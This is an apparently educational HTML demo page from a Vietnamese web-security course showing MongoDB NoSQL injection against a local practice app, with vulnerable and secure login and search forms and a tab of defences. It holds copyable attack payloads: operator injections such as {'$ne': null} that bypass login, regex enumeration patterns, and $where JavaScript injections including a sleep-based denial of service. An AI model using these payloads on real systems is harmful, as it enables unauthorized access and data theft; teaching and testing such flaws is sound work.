<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MongoDB NoSQL Injection Demo - An to√†n Web v√† CSDL</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîì MongoDB NoSQL Injection Demo</h1>
            <p class="subtitle">ƒê·ªÅ t√†i: T√¨m hi·ªÉu h·ªá CSDL MongoDB - M√¥n An to√†n Web v√† CSDL</p>
            <div class="warning">
                <strong>‚ö†Ô∏è C·∫¢NH B√ÅO:</strong> ƒê√¢y l√† demo cho m·ª•c ƒë√≠ch h·ªçc t·∫≠p. KH√îNG s·ª≠ d·ª•ng c√°c k·ªπ thu·∫≠t n√†y tr√™n h·ªá th·ªëng th·ª±c t·∫ø!
            </div>
        </div>

        <div class="exploit-guide">
            <h2>üìö H∆∞·ªõng d·∫´n Khai th√°c (Exploit Guide)</h2>
            
            <div class="tabs">
                <button class="tab active" onclick="switchTab('attack1')">Attack 1: Bypass Login</button>
                <button class="tab" onclick="switchTab('attack2')">Attack 2: Data Extraction</button>
                <button class="tab" onclick="switchTab('attack3')">Attack 3: JS Injection</button>
                <button class="tab" onclick="switchTab('protection')">üõ°Ô∏è Ph√≤ng ch·ªëng</button>
            </div>

            <div id="attack1" class="tab-content active">
                <div class="exploit-item">
                    <h3>üéØ Attack 1: Authentication Bypass</h3>
                    <p><strong>M√¥ t·∫£:</strong> S·ª≠ d·ª•ng MongoDB operators ƒë·ªÉ bypass x√°c th·ª±c m√† kh√¥ng c·∫ßn bi·∫øt password.</p>
                    <p><strong>C√°ch th·ª±c hi·ªán:</strong></p>
                    <ol>
                        <li>·ªû form "Vulnerable Login", nh·∫≠p payload sau v√†o Username v√† Password</li>
                        <li>Payload s·∫Ω khi·∫øn query lu√¥n tr·∫£ v·ªÅ true</li>
                    </ol>
                    
                    <p><strong>Payload 1 - Not Equal:</strong></p>
                    <div class="code">{"$ne": null}</div>
                    <button class="copy-btn" onclick='copyToClipboard("{\"$ne\": null}")'>üìã Copy</button>
                    <p class="mt-15"><strong>Payload 2 - Greater Than:</strong></p>
                    <div class="code">{"$gt": ""}</div>
                    <button class="copy-btn" onclick='copyToClipboard("{\"$gt\": \"\"}")'>üìã Copy</button>

                    <p class="mt-15"><strong>Gi·∫£i th√≠ch:</strong> Khi g·ª≠i <code>{"$ne": null}</code>, MongoDB query tr·ªü th√†nh:</p>
                    <div class="code">db.users.findOne({ username: {$ne: null}, password: {$ne: null} })</div>
                    <p>ƒêi·ªÅu n√†y lu√¥n ƒë√∫ng v·ªõi user ƒë·∫ßu ti√™n trong database (th∆∞·ªùng l√† admin)!</p>
                </div>
            </div>

            <div id="attack2" class="tab-content">
                <div class="exploit-item">
                    <h3>üéØ Attack 2: Regex Injection - Data Extraction</h3>
                    <p><strong>M√¥ t·∫£:</strong> S·ª≠ d·ª•ng regex ƒë·ªÉ tr√≠ch xu·∫•t d·ªØ li·ªáu t·ª´ng k√Ω t·ª±.</p>
                    <p><strong>C√°ch th·ª±c hi·ªán:</strong></p>
                    
                    <p><strong>Payload 1 - T√¨m users b·∫Øt ƒë·∫ßu b·∫±ng 'a':</strong></p>
                    <div class="code">^a</div>
                    <button class="copy-btn" onclick="copyToClipboard('^a')">üìã Copy</button>
                    
                    <p class="mt-15"><strong>Payload 2 - T√¨m users b·∫Øt ƒë·∫ßu b·∫±ng 'admin':</strong></p>
                    <div class="code">^admin</div>
                    <button class="copy-btn" onclick="copyToClipboard('^admin')">üìã Copy</button>
                    
                    <p class="mt-15"><strong>Payload 3 - T√¨m t·∫•t c·∫£ (wildcard):</strong></p>
                    <div class="code">.*</div>
                    <button class="copy-btn" onclick="copyToClipboard('.*')">üìã Copy</button>
                    
                    <p class="mt-15"><strong>Advanced - Blind Enumeration:</strong></p>
                    <div class="code">^admin.*</div>
                    <button class="copy-btn" onclick="copyToClipboard('^admin.*')">üìã Copy</button>
                    
                    <p class="mt-15"><strong>Gi·∫£i th√≠ch:</strong> Attacker c√≥ th·ªÉ d√πng regex ƒë·ªÉ enumerate t·ª´ng k√Ω t·ª± c·ªßa username/password m·ªôt c√°ch m√π qu√°ng (blind).</p>
                </div>
            </div>

            <div id="attack3" class="tab-content">
                <div class="exploit-item">
                    <h3>üéØ Attack 3: JavaScript Injection v·ªõi $where</h3>
                    <p><strong>M√¥ t·∫£:</strong> L·ªó h·ªïng C·ª∞C K·ª≤ NGUY HI·ªÇM - cho ph√©p th·ª±c thi JavaScript code tr√™n server.</p>
                    <p><strong>‚ö†Ô∏è C·∫¢NH B√ÅO:</strong> ƒê√¢y l√† l·ªó h·ªïng nghi√™m tr·ªçng nh·∫•t!</p>
                    
                    <p><strong>Payload 1 - Lu√¥n tr·∫£ v·ªÅ true:</strong></p>
                    <div class="code">' || '1'=='1</div>
                    <button class="copy-btn" onclick="copyToClipboard('\' || \'1\'==\'1')">üìã Copy</button>
                    
                    <p class="mt-15"><strong>Payload 2 - IIFE:</strong></p>
                    <div class="code">' || (function(){ return true; })() || '</div>
                    <button class="copy-btn" onclick="copyToClipboard('\'; (function(){ return true; })(); //')">üìã Copy</button>
                    
                    <p class="mt-15"><strong>Payload 3 - Sleep attack (DoS):</strong></p>
                    <div class="code">' || (function(){ sleep(5000); return true; })() || '</div>
                    <button class="copy-btn" onclick="copyToClipboard('\'; (function(){ sleep(5000); return true; })(); //')">üìã Copy</button>

                    <p class="mt-15"><strong>Gi·∫£i th√≠ch:</strong> Query ban ƒë·∫ßu:</p>
                    <div class="code">$where: "this.username == 'USER_INPUT'"</div>
                    <p>Sau khi inject <code>' || '1'=='1</code>, query tr·ªü th√†nh:</p>
                    <div class="code">$where: "this.username == '' || '1'=='1'"</div>
                    <p>K·∫øt qu·∫£: Lu√¥n tr·∫£ v·ªÅ true cho t·∫•t c·∫£ documents!</p>
                </div>
            </div>

            <div id="protection" class="tab-content">
                <div class="exploit-item">
                    <h3>üõ°Ô∏è C√°c bi·ªán ph√°p ph√≤ng ch·ªëng NoSQL Injection</h3>
                    
                    <h4 class="mt-20">1. Input Validation & Sanitization</h4>
                    <div class="code">// Ki·ªÉm tra ki·ªÉu d·ªØ li·ªáu
if (typeof username !== 'string' || typeof password !== 'string') {
    return error('Invalid input type');
}

// Lo·∫°i b·ªè c√°c k√Ω t·ª± nguy hi·ªÉm
const dangerous = /[\$\{\}]/;
if (dangerous.test(input)) {
    return error('Invalid characters');
}</div>
                    
                    <h4 class="mt-20">2. S·ª≠ d·ª•ng $eq Operator</h4>
                    <div class="code">// KH√îNG AN TO√ÄN
db.users.findOne({ username: req.body.username })

// AN TO√ÄN
db.users.findOne({ username: { $eq: req.body.username } })</div>
                    
                    <h4 class="mt-20">3. Tr√°nh $where Operator</h4>
                    <div class="code">// TUY·ªÜT ƒê·ªêI TR√ÅNH
db.users.findOne({ $where: `this.username == '${input}'` })

// S·ª¨ D·ª§NG
db.users.findOne({ username: { $eq: input } })</div>
                    
                    <h4 class="mt-20">4. Implement Authentication & Authorization</h4>
                    <ul class="mt-10">
                        <li>B·∫≠t authentication tr√™n MongoDB</li>
                        <li>S·ª≠ d·ª•ng role-based access control (RBAC)</li>
                        <li>Principle of least privilege</li>
                    </ul>
                    
                    <h4 class="mt-20">5. Use ORM/ODM Libraries</h4>
                    <div class="code">// Mongoose t·ª± ƒë·ªông escape
const User = mongoose.model('User', userSchema);
User.findOne({ username: username }); // Safe</div>
                    
                    <h4 class="mt-20">6. Rate Limiting & Monitoring</h4>
                    <ul class="mt-10">
                        <li>Gi·ªõi h·∫°n s·ªë l·∫ßn ƒëƒÉng nh·∫≠p sai</li>
                        <li>Monitor suspicious queries</li>
                        <li>Log t·∫•t c·∫£ failed attempts</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="grid">
            <!-- VULNERABLE LOGIN -->
            <div class="card vulnerable">
                <h2>
                    <span>üîì Vulnerable Login</span>
                    <span class="badge badge-danger">C√ì L·ªñ H·ªîNG</span>
                </h2>
                <form id="vulnerableLoginForm">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="vulnUsername" placeholder='Th·ª≠: {"$ne": null}'>
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="vulnPassword" placeholder='Th·ª≠: {"$ne": null}'>
                    </div>
                    <button type="submit">üöÄ Login (Vulnerable)</button>
                </form>
                <div id="vulnerableResult" class="result"></div>
            </div>

            <!-- SECURE LOGIN -->
            <div class="card secure">
                <h2>
                    <span>üîí Secure Login</span>
                    <span class="badge badge-success">B·∫¢O M·∫¨T</span>
                </h2>
                <form id="secureLoginForm">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="secureUsername" placeholder="admin">
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="securePassword" placeholder="Admin@123">
                    </div>
                    <button type="submit">‚úÖ Login (Secure)</button>
                </form>
                <div id="secureResult" class="result"></div>
            </div>

            <!-- VULNERABLE SEARCH -->
            <div class="card vulnerable">
                <h2>
                    <span>üîç Vulnerable Search</span>
                    <span class="badge badge-danger">VULNERABLE</span>
                </h2>
                <form id="searchForm">
                    <div class="form-group">
                        <label>T√¨m ki·∫øm ng∆∞·ªùi d√πng:</label>
                        <input type="text" id="searchTerm" placeholder='Nh·∫≠p t√™n ng∆∞·ªùi d√πng ƒë·ªÉ t√¨m ki·∫øm...'>
                    </div>
                    <button type="submit">üîé T√¨m ki·∫øm</button>
                </form>
                <div id="searchResult" class="result"></div>
                <div id="attackDetected" class="attack-alert" style="display:none">
                    <span class="attack-icon">‚ö†Ô∏è</span>
                    <div class="attack-message">
                        <strong>Ph√°t hi·ªán t·∫•n c√¥ng!</strong>
                        <p id="attackType"></p>
                    </div>
                </div>
            </div>

            <!-- SECURE SEARCH -->
            <div class="card secure">
                <h2>
                    <span>üîç Secure Search</span>
                    <span class="badge badge-success">PROTECTED</span>
                </h2>
                <form id="secureSearchForm">
                    <div class="form-group">
                        <label>T√¨m ki·∫øm an to√†n:</label>
                        <input type="text" id="secureSearchTerm" placeholder="Nh·∫≠p t·ª´ kh√≥a t√¨m ki·∫øm...">
                    </div>
                    <button type="submit">‚úÖ T√¨m ki·∫øm (An to√†n)</button>
                </form>
                <div id="secureSearchResult" class="result"></div>
            </div>
        </div>

        <!-- VALID CREDENTIALS -->
        <div class="card">
            <h2>üìã Valid Credentials (For Testing)</h2>
            <div class="user-info">
                <p><strong>Username:</strong> admin | <strong>Password:</strong> Admin@123 | <strong>Role:</strong> Admin</p>
                <p><strong>Username:</strong> john_doe | <strong>Password:</strong> John123! | <strong>Role:</strong> User</p>
                <p><strong>Username:</strong> jane_smith | <strong>Password:</strong> Jane@456 | <strong>Role:</strong> User</p>
                <p><strong>Username:</strong> bob_wilson | <strong>Password:</strong> Bob#789 | <strong>Role:</strong> Manager</p>
                <p><strong>Username:</strong> alice_brown | <strong>Password:</strong> Alice$321 | <strong>Role:</strong> User</p>
            </div>
        </div>
    </div>

    <script>
        // Switch tabs
        function switchTab(tabId) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tabId).classList.add('active');
        }

        // Copy to clipboard
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('‚úÖ ƒê√£ copy payload: ' + text);
            });
        }

        // Show result
        function showResult(elementId, success, message, data = null) {
            const resultDiv = document.getElementById(elementId);
            resultDiv.className = `result ${success ? 'success' : 'error'} show`;
            
            let html = `<strong>${success ? '‚úÖ Th√†nh c√¥ng!' : '‚ùå Th·∫•t b·∫°i!'}</strong><p>${message}</p>`;
            
            if (data && data.user) {
                html += `
                    <div class="user-info">
                        <h4>üìä Th√¥ng tin User (Data Leaked!):</h4>
                        <p><strong>Username:</strong> ${data.user.username}</p>
                        <p><strong>Email:</strong> ${data.user.email}</p>
                        <p><strong>Role:</strong> ${data.user.role}</p>
                        <p><strong>Department:</strong> ${data.user.department}</p>
                        <p><strong>üí∞ Salary:</strong> ${data.user.salary}</p>
                        <p><strong>üîê SSN:</strong> ${data.user.ssn}</p>
                    </div>
                `;
            }
            
            if (data && data.results) {
                html += `<div class="user-info"><h4>üîç K·∫øt qu·∫£ t√¨m ki·∫øm (${data.results.length} users):</h4>`;
                data.results.forEach(user => {
                    html += `<p>‚Ä¢ ${user.username} (${user.email}) - ${user.role}</p>`;
                });
                html += `</div>`;
            }
            
            resultDiv.innerHTML = html;
        }

        // Vulnerable Login
        document.getElementById('vulnerableLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            let username = document.getElementById('vulnUsername').value;
            let password = document.getElementById('vulnPassword').value;
            
            // Try to parse as JSON (for payload injection)
            try {
                username = JSON.parse(username);
            } catch (e) {
                // If not JSON, keep as string
            }
            
            try {
                password = JSON.parse(password);
            } catch (e) {
                // If not JSON, keep as string
            }
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                showResult('vulnerableResult', data.success, data.message, data);
            } catch (error) {
                showResult('vulnerableResult', false, 'L·ªói: ' + error.message);
            }
        });

        // Secure Login
        document.getElementById('secureLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('secureUsername').value;
            const password = document.getElementById('securePassword').value;
            
            try {
                const response = await fetch('/api/secure-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                showResult('secureResult', data.success, data.message, data);
            } catch (error) {
                showResult('secureResult', false, 'L·ªói: ' + error.message);
            }
        });

        // Vulnerable Search
        document.getElementById('searchForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const searchTerm = document.getElementById('searchTerm').value.trim();
            const searchButton = e.target.querySelector('button');

            // N·∫øu URL c√≥ query params, x√≥a ƒëi
            const url = window.location.pathname;
            window.history.replaceState({}, document.title, url);
            
            try {
                // Disable button during search
                searchButton.disabled = true;

                const response = await fetch('/api/search', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ searchTerm })
                });
                
                const data = await response.json();
                showResult('searchResult', data.success, `T√¨m th·∫•y ${data.results?.length || 0} k·∫øt qu·∫£`, data);
            } catch (error) {
                showResult('searchResult', false, 'L·ªói: ' + error.message);
            } finally {
                // Re-enable button
                searchButton.disabled = false;
            }
        });

        // Secure Search
        document.getElementById('secureSearchForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const searchTerm = document.getElementById('secureSearchTerm').value.trim();
            const searchButton = e.target.querySelector('button');
            
            try {
                // Disable button during search
                searchButton.disabled = true;

                const response = await fetch('/api/secure/search', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ searchTerm })
                });
                
                const data = await response.json();
                showResult('secureSearchResult', data.success, `T√¨m th·∫•y ${data.users?.length || 0} k·∫øt qu·∫£`, data);
            } catch (error) {
                showResult('secureSearchResult', false, 'L·ªói: ' + error.message);
            } finally {
                // Re-enable button
                searchButton.disabled = false;
            }
        });
    </script>
</body>
</html>